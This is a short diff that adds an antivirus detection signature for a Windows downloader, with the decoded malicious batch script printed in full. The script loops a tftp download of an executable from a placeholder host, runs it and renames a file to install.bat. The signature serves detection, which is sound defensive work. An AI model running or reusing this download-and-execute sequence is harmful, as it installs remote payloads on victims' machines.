@@ -1,0 +1,11 @@
+VIRUS NAME: Win.Downloader.Dlexbat-1
+TARGET TYPE: ANY FILE
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off
+cd \Inetpub\scripts
+startDL:
+tftp.exe -i a.b.c.d get DL.exe
+if not exist DL.exe goto startDL
+start /w DL.exe
+ren 00.D install.bat
